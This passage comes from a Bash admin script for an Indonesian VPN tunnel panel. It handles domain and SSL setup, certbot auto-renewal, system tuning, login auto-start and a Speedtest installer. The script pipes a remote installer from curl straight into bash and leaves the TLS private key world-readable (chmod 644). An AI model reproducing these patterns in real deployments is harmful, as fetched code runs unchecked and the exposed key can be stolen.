    local rpad=$(( c - rlen )); [ $rpad -lt 0 ] && rpad=0



    printf "  %b%${lpad}s%b%${rpad}s\n" "$left" "" "$right" ""



    }



    _mrow1() {



        # 1 kolom tengah



        local c=$1 n1="$2" lb1="$3"



        local text="${CYAN}[${n1}]${NC} ${WHITE}${lb1}${NC}"



        _box_center $W "$text"



    }







    # ── ACCOUNT MANAGEMENT ──



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}ACCOUNT MANAGEMENT${NC}"



    _box_divider $W



    _mrow $col " 1" "SSH / OpenVPN"    " 5" "List All Accounts"



    _mrow $col " 2" "VMess Account"    " 6" "Renew / Extend Akun"



    _mrow $col " 3" "VLess Account"    " 7" "Check Expired"



    _mrow $col " 4" "Trojan Account"   " 8" "Delete Expired"



    _box_bottom $W



    echo ""







    # ── SYSTEM CONTROL ──



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}SYSTEM CONTROL${NC}"



    _box_divider $W



    _mrow $col " 9" "Telegram Bot"     "14" "Speedtest VPS"



    _mrow $col "10" "Change Domain"    "15" "Backup Config"



    _mrow $col "11" "SSL Manager"      "16" "Restore Config"



    _mrow $col "12" "Optimize VPS"     "17" "Uninstall Panel"



    _mrow $col "13" "Restart Service"  "18" "Advanced Mode"    _mrow $col "19" "Port Info"        "20" "ZI VPN UDP"
    _mrow $col "21" "OrderVPN Web"     "22" "DDoS Protect"
    _mrow $col "23" "Traffic Monitor"  "24" "Health Check"




    _box_divider $W



    printf "  ${RED}[0]${NC}  ${WHITE}Exit Panel${NC}\n"



    _box_divider $W



    printf "  Telegram : ${CYAN}@YouzinCrabz${NC}\n"



    _box_bottom $W



    echo ""



}







#================================================



# DOMAIN SETUP



#================================================







generate_random_domain() {



    local ip_vps chars random_str



    ip_vps=$(get_ip)



    chars="abcdefghijklmnopqrstuvwxyz"



    random_str=""



    for i in {1..6}; do random_str+="${chars:RANDOM%26:1}"; done



    echo "${random_str}.${ip_vps}.nip.io"



}







setup_domain() {



    clear



    print_menu_header "SETUP DOMAIN"



    echo -e "  ${WHITE}[1]${NC} Pakai domain sendiri"



    echo -e "      ${YELLOW}Contoh: vpn.example.com${NC}"



    echo -e "      ${DIM}SSL: Let's Encrypt${NC}"



    echo ""



    echo -e "  ${WHITE}[2]${NC} Generate domain otomatis"



    local preview; preview=$(generate_random_domain)



    echo -e "      ${YELLOW}Contoh: ${preview}${NC}"



    echo -e "      ${DIM}SSL: Self-signed${NC}"



    echo ""



    read -rp "  Pilih [1/2]: " domain_choice



    case $domain_choice in



        1)



            echo ""



            read -rp "  Masukkan domain: " input_domain



            [[ -z "$input_domain" ]] && { echo -e "${RED}  ✘ Domain kosong!${NC}"; sleep 2; setup_domain; return; }



            # Validasi format domain sederhana



            if ! echo "$input_domain" | grep -qE '^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'; then



                echo -e "${RED}  ✘ Format domain tidak valid!${NC}"



                sleep 2; setup_domain; return



            fi



            DOMAIN="$input_domain"



            echo "custom" > "$DOMAIN_TYPE_FILE"



            ;;



        2)



            DOMAIN=$(generate_random_domain)



            echo "random" > "$DOMAIN_TYPE_FILE"



            echo -e "  ${GREEN}Domain: ${CYAN}${DOMAIN}${NC}"



            sleep 1



            ;;



        *)



            echo -e "  ${RED}✘ Tidak valid!${NC}"



            sleep 1; setup_domain; return



            ;;



    esac



    echo "$DOMAIN" > "$DOMAIN_FILE"


}

setup_web_domain() {

    clear

    print_menu_header "SETUP DOMAIN WEB (OrderVPN)"

    echo -e "  ${WHITE}[1]${NC} Pakai domain sendiri"
    echo -e "      ${YELLOW}Contoh: web.example.com${NC}"
    echo -e "      ${DIM}Pastikan domain sudah di-pointing ke IP VPS${NC}"

    echo ""

    echo -e "  ${WHITE}[2]${NC} Generate domain otomatis"
    local preview; preview=$(generate_random_domain)
    echo -e "      ${YELLOW}Contoh: ${preview}${NC}"
    echo -e "      ${DIM}SSL: Self-signed${NC}"

    echo ""

    echo -e "  ${WHITE}[3]${NC} Pakai domain utama (${CYAN}$(cat "$DOMAIN_FILE" 2>/dev/null || echo "belum diset")${NC})"

    echo ""

    read -rp "  Pilih [1/2/3]: " domain_choice

    case $domain_choice in

        1)
            echo ""
            read -rp "  Masukkan domain: " input_domain

            [[ -z "$input_domain" ]] && { echo -e "${RED}  ✘ Domain kosong!${NC}"; sleep 2; setup_web_domain; return; }

            if ! echo "$input_domain" | grep -qE '^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'; then
                echo -e "${RED}  ✘ Format domain tidak valid!${NC}"
                sleep 2; setup_web_domain; return
            fi

            WEB_DOMAIN="$input_domain"
            ;;

        2)
            WEB_DOMAIN=$(generate_random_domain)
            echo -e "  ${GREEN}Domain: ${CYAN}${WEB_DOMAIN}${NC}"
            sleep 1
            ;;

        3)
            if [[ -f "$DOMAIN_FILE" ]]; then
                WEB_DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)
                echo -e "  ${GREEN}Menggunakan domain utama: ${CYAN}${WEB_DOMAIN}${NC}"
                sleep 1
            else
                echo -e "${RED}  ✘ Domain utama belum diset!${NC}"
                sleep 2; setup_web_domain; return
            fi
            ;;

        *)
            echo -e "  ${RED}✘ Tidak valid!${NC}"
            sleep 1; setup_web_domain; return
            ;;

    esac

    echo "$WEB_DOMAIN" > "$WEB_DOMAIN_FILE"
    echo -e "  ${GREEN}✔ Domain web disimpan: ${CYAN}${WEB_DOMAIN}${NC}"

}

get_ssl_cert() {



    local domain_type="custom"



    [[ -f "$DOMAIN_TYPE_FILE" ]] && domain_type=$(cat "$DOMAIN_TYPE_FILE")



    [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)
    [[ -z "$DOMAIN" ]] && DOMAIN="(unknown)"
    mkdir -p /etc/xray



    if [[ "$domain_type" == "custom" ]]; then



        # Pastikan port 80 bebas dulu



        systemctl stop nginx haproxy 2>/dev/null



        sleep 1



        # Install certbot dengan compatibility layer



        install_certbot_compat "custom"



        if command -v certbot >/dev/null 2>&1; then



            certbot certonly --standalone \
                -d "$DOMAIN" \
                --non-interactive \
                --agree-tos \
                --register-unsafely-without-email \
                --timeout 120



            if [[ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ]]; then



                cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /etc/xray/xray.crt && \
                cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /etc/xray/xray.key || { echo -e "  ${RED}✘ Gagal copy cert/key dari Let's Encrypt!${NC}"; _gen_self_signed; return; }



                if _verify_cert_key; then
                    echo -e "  ${GREEN}✔ Let's Encrypt cert berhasil + verified!${NC}"
                else
                    echo -e "  ${RED}✘ Cert & key MISMATCH dari Let's Encrypt! Fallback self-signed...${NC}"
                    _gen_self_signed
                fi



            else



                echo -e "  ${YELLOW}⚠ Certbot gagal, fallback ke self-signed${NC}"



                _gen_self_signed



            fi



        else



            echo -e "  ${YELLOW}⚠ certbot tidak tersedia, pakai self-signed${NC}"



            _gen_self_signed
            _verify_cert_key || echo -e "  ${RED}✘ Self-signed cert-key MISMATCH! Coba ulangi.${NC}"



        fi



    else



        _gen_self_signed
        _verify_cert_key || echo -e "  ${RED}✘ Self-signed cert-key MISMATCH! Coba ulangi.${NC}"



    fi



    chmod 644 /etc/xray/xray.* 2>/dev/null



}







# Verify xray.crt and xray.key are a matching pair (same modulus)
_verify_cert_key() {
    local cert_mod key_mod
    cert_mod=$(openssl x509 -in /etc/xray/xray.crt -noout -modulus 2>/dev/null | md5sum | cut -d' ' -f1)
    key_mod=$(openssl rsa -in /etc/xray/xray.key -noout -modulus 2>/dev/null | md5sum | cut -d' ' -f1)
    [[ -n "$cert_mod" && -n "$key_mod" && "$cert_mod" == "$key_mod" ]] && return 0 || return 1
}

_gen_self_signed() {



    openssl req -new -newkey rsa:2048 \
        -days 3650 -nodes -x509 \
        -subj "/C=ID/ST=Jakarta/L=Jakarta/O=VPN/CN=${DOMAIN}" \
        -keyout /etc/xray/xray.key \
        -out /etc/xray/xray.crt 2>/dev/null && \
        chmod 644 /etc/xray/xray.* 2>/dev/null && \
        _verify_cert_key || echo -e "  ${RED}✘ Self-signed cert generation FAILED!${NC}"



}







#================================================



# SETUP MENU COMMAND



#================================================







setup_menu_command() {

    # Deploy quick-test.sh health checker (dari folder yang sama dgn vpn.sh)
    local qs_src="$(dirname "$SCRIPT_PATH")/quick-test.sh"
    if [[ -f "$qs_src" ]]; then
        cp "$qs_src" /root/quick-test.sh 2>/dev/null && chmod +x /root/quick-test.sh 2>/dev/null
    elif [[ -f ./quick-test.sh ]]; then
        cp ./quick-test.sh /root/quick-test.sh 2>/dev/null && chmod +x /root/quick-test.sh 2>/dev/null
    fi



    # Buat command shortcut 'menu'



    printf '#!/bin/bash\n[[ -f /root/vpn.sh ]] && exec bash /root/vpn.sh || echo "vpn.sh tidak ditemukan!"\n' \
        > /usr/local/bin/menu



    chmod +x /usr/local/bin/menu







    # ── METODE 1: /etc/profile.d/ — paling reliable untuk SSH login ──



    # Ini dijalankan untuk SEMUA interactive login shell (ssh, su -, dll)



    cat > /etc/profile.d/vpn-panel.sh << 'PROFILEEOF'



# VPN Panel Auto-Start



if [ "$(id -u)" -eq 0 ] && [ -n "$PS1" ] && [ -z "$VPN_MENU_RUNNING" ]; then



    export VPN_MENU_RUNNING=1



    mesg n 2>/dev/null



    # Pakai source (.) agar setelah exit menu, shell login tetap hidup



    [ -f /root/vpn.sh ] && . /root/vpn.sh



fi



PROFILEEOF



    chmod 644 /etc/profile.d/vpn-panel.sh







    # ── METODE 2: .bashrc sebagai fallback ──



    # Bersihkan entri lama dulu



    if [[ -f /root/.bashrc ]]; then



        awk '



            /# VPN Panel Auto-Start/ { skip=1 }



            skip && /^fi[[:space:]]*$/ { skip=0; next }



            !skip { print }



        ' /root/.bashrc > /tmp/_bashrc_clean.tmp 2>/dev/null && \
        grep -v -E 'tunnel\.sh|VPN_MENU_RUNNING|mesg n 2>|# VPN Panel' \
            /tmp/_bashrc_clean.tmp > /tmp/_bashrc_clean2.tmp 2>/dev/null && \
        mv /tmp/_bashrc_clean2.tmp /root/.bashrc



        rm -f /tmp/_bashrc_clean.tmp /tmp/_bashrc_clean2.tmp 2>/dev/null || true



    fi



    # Tulis entri baru di .bashrc



    if ! grep -q "VPN Panel Auto-Start" /root/.bashrc 2>/dev/null; then



        printf '\n# VPN Panel Auto-Start\n' >> /root/.bashrc



        printf 'if [ -n "$PS1" ] && [ "$EUID" -eq 0 ] && [ -z "$VPN_MENU_RUNNING" ]; then\n' >> /root/.bashrc



        printf '    export VPN_MENU_RUNNING=1\n' >> /root/.bashrc



        printf '    mesg n 2>/dev/null\n' >> /root/.bashrc



        printf '    [ -f /root/vpn.sh ] && . /root/vpn.sh\n' >> /root/.bashrc



        printf 'fi\n' >> /root/.bashrc



    fi







    # Suppress system wall messages



    mkdir -p /etc/systemd/journald.conf.d



    printf '[Journal]\nForwardToWall=no\n' > /etc/systemd/journald.conf.d/no-wall.conf



    systemctl restart systemd-journald >/dev/null 2>&1 || true



    touch /root/.hushlogin 2>/dev/null || true



}







#================================================



# SETUP SWAP



#================================================







setup_swap() {



    clear



    print_menu_header "SETUP SWAP 1GB"



    local swap_total; swap_total=$(free -m | awk 'NR==3{print $2}')



    if [[ "$swap_total" -gt 0 ]]; then



        echo -e "  ${YELLOW}Swap ada: ${swap_total}MB${NC}"



        swapoff -a 2>/dev/null



        sed -i '/swapfile/d' /etc/fstab



        rm -f /swapfile



    fi



    echo -e "  ${CYAN}Creating 1GB swap...${NC}"



    fallocate -l 1G /swapfile 2>/dev/null || dd if=/dev/zero of=/swapfile bs=1M count=1024 2>/dev/null



    chmod 600 /swapfile



    mkswap /swapfile >/dev/null 2>&1



    swapon /swapfile



    grep -q "/swapfile" /etc/fstab || echo "/swapfile none swap sw 0 0" >> /etc/fstab



    echo -e "  ${GREEN}✔ Swap 1GB OK!${NC}"



    sleep 2



}







#================================================



# OPTIMIZE VPN



#================================================







optimize_vpn() {



    echo -e "  ${CYAN}Mengoptimasi sistem...${NC}"







    # Sysctl tuning — hapus tw_reuse (usang di kernel 5.x+), tambah fastopen + mtu probing



    cat > /etc/sysctl.d/99-vpn.conf << 'SYSEOF'



net.ipv4.tcp_keepalive_time = 30



net.ipv4.tcp_keepalive_intvl = 5



net.ipv4.tcp_keepalive_probes = 6



net.ipv4.tcp_fin_timeout = 10



net.core.rmem_max = 67108864



net.core.wmem_max = 67108864



net.ipv4.tcp_rmem = 4096 87380 67108864



net.ipv4.tcp_wmem = 4096 65536 67108864



net.core.netdev_max_backlog = 250000



net.core.somaxconn = 65535



net.ipv4.tcp_max_syn_backlog = 65535



net.core.default_qdisc = fq



net.ipv4.tcp_congestion_control = bbr



net.ipv4.tcp_fastopen = 3



net.ipv4.tcp_mtu_probing = 1



net.ipv4.ip_forward = 1



vm.swappiness = 10



net.ipv6.conf.all.disable_ipv6 = 1



net.ipv6.conf.default.disable_ipv6 = 1



SYSEOF







    # Load BBR module jika support



    if modprobe tcp_bbr 2>/dev/null; then



        echo "tcp_bbr" > /etc/modules-load.d/bbr.conf 2>/dev/null



    else



        modprobe tcp_htcp 2>/dev/null || true



    fi







    # Apply settings



    sysctl --system >/dev/null 2>&1 || sysctl -p /etc/sysctl.d/99-vpn.conf >/dev/null 2>&1







    # Verifikasi apakah BBR benar-benar aktif



    local cc



    cc=$(sysctl -n net.ipv4.tcp_congestion_control 2>/dev/null)



    if [[ "$cc" == "bbr" ]]; then



        echo -e "  ${GREEN}✔ BBR active: ${cc}${NC}"



    elif [[ -n "$cc" ]]; then



        echo -e "  ${YELLOW}⚠ BBR tidak support, fallback ke: ${cc}${NC}"



    else



        echo -e "  ${YELLOW}⚠ Tidak bisa verifikasi congestion control${NC}"



    fi







    # Set file descriptor limits



    cat > /etc/security/limits.d/99-vpn.conf << 'LIMEOF'



* soft nofile 65535



* hard nofile 65535



root soft nofile 65535



root hard nofile 65535



LIMEOF







    echo -e "  ${GREEN}✔ File descriptor limits: 65535${NC}"



    echo -e "  ${GREEN}✔ Optimasi selesai!${NC}"



    sleep 1



}







#================================================



# SETUP KEEPALIVE



#================================================







setup_keepalive() {



    local sshcfg="/etc/ssh/sshd_config"



    grep -q "^ClientAliveInterval" "$sshcfg" && \
        sed -i 's/^ClientAliveInterval.*/ClientAliveInterval 30/' "$sshcfg" || \
        echo "ClientAliveInterval 30" >> "$sshcfg"



    grep -q "^ClientAliveCountMax" "$sshcfg" && \
        sed -i 's/^ClientAliveCountMax.*/ClientAliveCountMax 6/' "$sshcfg" || \
        echo "ClientAliveCountMax 6" >> "$sshcfg"



    grep -q "^TCPKeepAlive" "$sshcfg" && \
        sed -i 's/^TCPKeepAlive.*/TCPKeepAlive yes/' "$sshcfg" || \
        echo "TCPKeepAlive yes" >> "$sshcfg"



    # Ubuntu 22+ pakai 'ssh', Ubuntu 20 pakai 'sshd'



    local ssh_svc; ssh_svc=$(get_ssh_service_name)



    systemctl restart "$ssh_svc" 2>/dev/null







    mkdir -p /etc/systemd/system/xray.service.d



    cat > /etc/systemd/system/xray.service.d/override.conf << 'XEOF'



[Service]



Restart=always



RestartSec=3



LimitNOFILE=65535



XEOF







    cat > /usr/local/bin/vpn-keepalive.sh << 'KAEOF'



#!/bin/bash



while true; do



    GW=$(ip route | awk '/default/{print $3; exit}')



    [[ -n "$GW" ]] && ping -c1 -W2 "$GW" >/dev/null 2>&1



    ping -c1 -W2 8.8.8.8 >/dev/null 2>&1



    sleep 25



done



KAEOF



    chmod +x /usr/local/bin/vpn-keepalive.sh







    cat > /etc/systemd/system/vpn-keepalive.service << 'KASEOF'



[Unit]



Description=VPN Keepalive



After=network.target xray.service







[Service]



Type=simple



ExecStart=/usr/local/bin/vpn-keepalive.sh



Restart=always



RestartSec=5



LimitNOFILE=65535







[Install]



WantedBy=multi-user.target



KASEOF



    systemctl daemon-reload



    systemctl enable vpn-keepalive 2>/dev/null



    systemctl restart vpn-keepalive 2>/dev/null



}







#================================================



# HAPROXY CONFIG - Support WS TLS + gRPC di 443



#================================================







configure_haproxy() {



    # HAProxy config minimal - nginx langsung handle port 443



    # HAProxy tetap enabled agar service tidak error tapi tidak bind port



    cat > /etc/haproxy/haproxy.cfg << 'HAEOF'



global



    log /dev/log local0



    maxconn 65535



    daemon







defaults



    log global



    mode tcp



    timeout connect 5s



    timeout client  1h



    timeout server  1h



    option dontlognull



HAEOF



}







#================================================



# CHANGE DOMAIN



#================================================







change_domain() {



    clear



    print_menu_header "CHANGE DOMAIN"



    echo -e "  Current: ${GREEN}${DOMAIN:-Not Set}${NC}"



    echo ""



    setup_domain



    echo -e "  ${YELLOW}Jalankan Fix Certificate [11]!${NC}"



    sleep 3



}







#================================================



# FIX CERTIFICATE



#================================================







fix_certificate() {



    clear



    print_menu_header "FIX / RENEW CERTIFICATE"



    [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)



    [[ -z "$DOMAIN" ]] && { echo -e "  ${RED}✘ Domain belum diset!${NC}"; sleep 3; return; }



    echo -e "  Domain: ${GREEN}${DOMAIN}${NC}"



    echo ""



    # Stop service yang pakai port 80/443 dulu



    systemctl stop haproxy 2>/dev/null



    systemctl stop nginx   2>/dev/null



    sleep 1



    get_ssl_cert



    # Restart dengan validasi



    restart_service_safe "nginx" "nginx -t"



    restart_service_safe "haproxy"



    restart_service_safe "xray" "xray -test -config $XRAY_CONFIG"



    echo -e "  ${GREEN}✔ Done!${NC}"



    sleep 3



}







#================================================



# SSL AUTO RENEW — Cronjob-based Let's Encrypt renewal



#================================================







_ssl_auto_renew_setup() {



    clear



    print_menu_header "SETUP SSL AUTO-RENEW"



    [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)



    [[ -z "$DOMAIN" ]] && { echo -e "  ${RED}✘ Domain belum diset! Setup domain dulu [menu 10].${NC}"; sleep 3; return; }







    local domain_type="custom"



    [[ -f "$DOMAIN_TYPE_FILE" ]] && domain_type=$(cat "$DOMAIN_TYPE_FILE")



    if [[ "$domain_type" != "custom" ]]; then



        echo -e "  ${YELLOW}⚠ Domain auto-generated (nip.io) — tidak perlu SSL renew.${NC}"



        echo -e "  ${DIM}SSL self-signed tidak expired selama 10 tahun.${NC}"



        sleep 3; return



    fi







    # Cek apakah certbot tersedia



    if ! command -v certbot >/dev/null 2>&1; then



        echo -e "  ${CYAN}Installing certbot dulu...${NC}"



        install_certbot_compat "custom"



        if ! command -v certbot >/dev/null 2>&1; then



            echo -e "  ${RED}✘ certbot gagal diinstall!${NC}"



            sleep 3; return



        fi



    fi







    echo -e "  Domain : ${GREEN}${DOMAIN}${NC}"



    echo -e "  ${DIM}Auto-renew akan berjalan tanggal 1 & 15 setiap bulan jam 3 pagi${NC}"



    echo ""







    # Buat script auto-renew



    cat > /usr/local/bin/ssl-auto-renew.sh << 'SSLAUTORENEW'



#!/bin/bash



# SSL Auto-Renew Script — Youzin Crabz Tunel



# Dijalankan via cron: 0 3 1,15 * *



PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin



DOMAIN_FILE="/root/domain"



# ── Verify cert & key match ──
_verify_cert_key() {
    local cert_mod key_mod
    cert_mod=$(openssl x509 -in /etc/xray/xray.crt -noout -modulus 2>/dev/null | md5sum | cut -d' ' -f1)
    key_mod=$(openssl rsa -in /etc/xray/xray.key -noout -modulus 2>/dev/null | md5sum | cut -d' ' -f1)
    [[ -n "$cert_mod" && -n "$key_mod" && "$cert_mod" == "$key_mod" ]] && return 0 || return 1
}



LOG="/var/log/ssl-renew.log"







exec >> "$LOG" 2>&1



echo "========================================"



echo "SSL Auto-Renew: $(date)"







[[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs) || { echo "ERROR: Domain file not found"; exit 1; }



[[ -z "$DOMAIN" ]] && { echo "ERROR: Domain not set"; exit 1; }







# Stop services yang pakai port 80



systemctl stop nginx 2>/dev/null



systemctl stop haproxy 2>/dev/null



sleep 2







# Renew via certbot standalone



if certbot renew --standalone --non-interactive --agree-tos --no-random-sleep-on-renew --quiet 2>/dev/null; then



    echo "certbot renew: SUCCESS"



    if [[ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ]]; then



        cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /etc/xray/xray.crt && \
        cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /etc/xray/xray.key



        chmod 644 /etc/xray/xray.*
        if _verify_cert_key; then
            echo "Cert copied to /etc/xray/: OK (verified)"
        else
            echo "Cert copied: FAILED — cert & key MISMATCH!"
        fi



    fi



else



    echo "certbot renew: FAILED — trying certonly fallback..."



    # Fallback: certonly



    if certbot certonly --standalone -d "$DOMAIN" --non-interactive --agree-tos --register-unsafely-without-email --quiet 2>/dev/null; then



        echo "certbot certonly: SUCCESS"



        if [[ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ]]; then



            cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /etc/xray/xray.crt && \
            cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /etc/xray/xray.key



            chmod 644 /etc/xray/xray.*
            if _verify_cert_key; then
                echo "Cert copied to /etc/xray/: OK (verified)"
            else
                echo "Cert copied: FAILED — cert & key MISMATCH!"
            fi



        fi



    else



        echo "certbot certonly: FAILED"



    fi



fi







# Restart services



systemctl start nginx 2>/dev/null



systemctl start haproxy 2>/dev/null







# Reload nginx & restart xray if config valid



nginx -t 2>/dev/null && systemctl reload nginx 2>/dev/null



xray -test -config /usr/local/etc/xray/config.json >/dev/null 2>&1 && systemctl restart xray 2>/dev/null







echo "SSL Auto-Renew: DONE — $(date)"



SSLAUTORENEW



    chmod +x /usr/local/bin/ssl-auto-renew.sh







    # Pasang cronjob: tgl 1 dan 15 setiap bulan jam 3 pagi



    (crontab -l 2>/dev/null | grep -v "ssl-auto-renew"; echo "0 3 1,15 * * /usr/local/bin/ssl-auto-renew.sh") | crontab -







    echo -e "  ${GREEN}✔ SSL Auto-Renew AKTIF!${NC}"



    echo -e "  ${DIM}Script : /usr/local/bin/ssl-auto-renew.sh${NC}"



    echo -e "  ${DIM}Log    : /var/log/ssl-renew.log${NC}"



    echo -e "  ${DIM}Jadwal : Tanggal 1 & 15, jam 3 pagi${NC}"



    echo ""



    echo -e "  ${YELLOW}Tips: Cek log dengan: tail -f /var/log/ssl-renew.log${NC}"



    sleep 3



}







_ssl_auto_renew_disable() {



    clear



    print_menu_header "DISABLE SSL AUTO-RENEW"



    if crontab -l 2>/dev/null | grep -q "ssl-auto-renew"; then



        echo -e "  ${YELLOW}Cronjob SSL Auto-Renew terdeteksi:${NC}"



        crontab -l 2>/dev/null | grep "ssl-auto-renew" | sed "s/^/    /"



        echo ""



        read -rp "  Yakin nonaktifkan? [y/N]: " yn



        if [[ "${yn,,}" == "y" ]]; then



            crontab -l 2>/dev/null | grep -v "ssl-auto-renew" | crontab -



            rm -f /usr/local/bin/ssl-auto-renew.sh



            echo -e "  ${GREEN}✔ SSL Auto-Renew dinonaktifkan!${NC}"



        else



            echo -e "  ${DIM}Dibatalkan.${NC}"



        fi



    else



        echo -e "  ${YELLOW}SSL Auto-Renew memang belum aktif.${NC}"



    fi



    sleep 2



}







_ssl_auto_renew_status() {



    if crontab -l 2>/dev/null | grep -q "ssl-auto-renew"; then



        echo -e "  ${GREEN}● SSL Auto-Renew: AKTIF${NC}"



        crontab -l 2>/dev/null | grep "ssl-auto-renew" | sed 's/^/    /'



    else



        echo -e "  ${YELLOW}○ SSL Auto-Renew: NON-AKTIF${NC}"



    fi



}







menu_ssl() {



    while true; do



        clear



        print_menu_header "SSL CERTIFICATE MANAGER"



        [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)



        echo -e "  Domain : ${GREEN}${DOMAIN:-Not Set}${NC}"



        echo ""



        _ssl_auto_renew_status



        echo ""



        printf "  ${WHITE}[1]${NC} Fix / Renew Certificate (manual)



"



        printf "  ${WHITE}[2]${NC} Setup SSL Auto-Renew (cronjob)



"



        printf "  ${WHITE}[3]${NC} Disable SSL Auto-Renew



"



        printf "  ${WHITE}[4]${NC} Test Auto-Renew sekarang



"



        printf "  ${WHITE}[5]${NC} Lihat log SSL renew



"



        printf "  ${RED}[0]${NC} Kembali



"



        echo ""



        read -rp "  Select: " ssl_choice



        case $ssl_choice in



            1) fix_certificate ;;



            2) _ssl_auto_renew_setup ;;



            3) _ssl_auto_renew_disable ;;



            4)



                clear



                print_menu_header "TEST SSL AUTO-RENEW"



                if [[ -x /usr/local/bin/ssl-auto-renew.sh ]]; then



                    echo -e "  ${CYAN}Menjalankan auto-renew...${NC}"



                    /usr/local/bin/ssl-auto-renew.sh



                    echo ""



                    echo -e "  ${GREEN}✔ Selesai! Cek log: tail /var/log/ssl-renew.log${NC}"



                else



                    echo -e "  ${RED}✘ Script auto-renew belum terinstall. Setup dulu [menu 2].${NC}"



                fi



                echo ""; read -rp "  Tekan ENTER..." ;;



            5)



                clear



                print_menu_header "LOG SSL AUTO-RENEW"



                if [[ -f /var/log/ssl-renew.log ]]; then



                    tail -50 /var/log/ssl-renew.log



                    echo ""



                    printf "  ${DIM}Log lengkap: /var/log/ssl-renew.log${NC}



"



                else



                    echo -e "  ${DIM}Log belum tersedia.${NC}"



                fi



                echo ""; read -rp "  Tekan ENTER..." ;;



            0) break ;;



            *) echo -e "  ${RED}✘ Invalid!${NC}"; sleep 1 ;;



        esac



    done



}







#================================================



# SPEEDTEST - Ookla Official CLI



#================================================







run_speedtest() {



    clear



    print_menu_header "SPEEDTEST BY OOKLA"



    echo -e "  ${YELLOW}Menyiapkan speedtest...${NC}"







    # Install Ookla speedtest CLI jika belum ada



    if ! command -v speedtest >/dev/null 2>&1; then



        echo -e "  ${CYAN}Installing Speedtest CLI (Ookla)...${NC}"



        # Install via official repo



        if curl -s https://packagecloud.io/install/repositories/ookla/speedtest-cli/script.deb.sh | bash >/dev/null 2>&1; then



            apt-get update -qq >/dev/null 2>&1



            apt-get install -y speedtest >/dev/null 2>&1



        fi



    fi







    # Cek ulang setelah install



    if ! command -v speedtest >/dev/null 2>&1; then



        echo -e "  ${RED}✘ Speedtest CLI tidak bisa diinstall!${NC}"



        echo -e "  ${YELLOW}Mencoba install manual...${NC}"



        local arch; arch=$(uname -m)



        local dl_url=""



        case "$arch" in



            x86_64)  dl_url="https://install.speedtest.net/app/cli/ookla-speedtest-1.2.0-linux-x86_64.tgz" ;;



            aarch64) dl_url="https://install.speedtest.net/app/cli/ookla-speedtest-1.2.0-linux-aarch64.tgz" ;;



            armv7l)  dl_url="https://install.speedtest.net/app/cli/ookla-speedtest-1.2.0-linux-armhf.tgz" ;;



            *)       echo -e "  ${RED}✘ Arsitektur tidak didukung: ${arch}${NC}"; echo ""; read -rp "  Press any key to back..."; return ;;



        esac



        mkdir -p /tmp/speedtest_dl



        curl -L --max-time 60 "$dl_url" -o /tmp/speedtest_dl/speedtest.tgz 2>/dev/null



        if [[ -f /tmp/speedtest_dl/speedtest.tgz ]]; then



            tar -xzf /tmp/speedtest_dl/speedtest.tgz -C /tmp/speedtest_dl/ 2>/dev/null



            if [[ -f /tmp/speedtest_dl/speedtest ]]; then



                cp /tmp/speedtest_dl/speedtest /usr/local/bin/speedtest



                chmod +x /usr/local/bin/speedtest



                echo -e "  ${GREEN}✔ Speedtest CLI berhasil diinstall!${NC}"



            fi



        fi



        rm -rf /tmp/speedtest_dl 2>/dev/null



    fi







    if ! command -v speedtest >/dev/null 2>&1; then



        echo -e "  ${RED}✘ Speedtest tidak tersedia. Cek koneksi internet!${NC}"



        echo ""



        read -rp "  Press any key to back..."



        return



    fi







    echo -e "  ${YELLOW}Testing... harap tunggu ~30 detik${NC}"



    echo ""







    local result



    result=$(speedtest --accept-license --accept-gdpr 2>/dev/null)







    if [[ -z "$result" ]]; then



        echo -e "  ${RED}✘ Speedtest gagal! Coba lagi nanti.${NC}"



        echo ""



        read -rp "  Press any key to back..."



        return



    fi







    # Parse hasil speedtest Ookla



    local server latency dl ul url isp



    server=$(echo "$result"  | grep -i "Server:"   | sed 's/.*Server: //'  | head -1)



    isp=$(echo "$result"     | grep -i "ISP:"       | sed 's/.*ISP: //'     | head -1)



    latency=$(echo "$result" | grep -i "Latency:"   | awk '{print $2,$3}'   | head -1)



    dl=$(echo "$result"      | grep -i "Download:"  | awk '{print $2,$3}'   | head -1)



    ul=$(echo "$result"      | grep -i "Upload:"    | awk '{print $2,$3}'   | head -1)



    url=$(echo "$result"     | grep -i "Result URL:"| awk '{print $NF}'     | head -1)







    local W; W=$(get_width)



    local inner=$(( W - 4 ))



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC}: ${GREEN}%s${NC}\n" "ISP"        "${isp:-N/A}"



    printf "  ${WHITE}%-16s${NC}: ${GREEN}%s${NC}\n" "Server"     "${server:-N/A}"



    printf "  ${WHITE}%-16s${NC}: ${YELLOW}%s${NC}\n" "Latency"   "${latency:-N/A}"



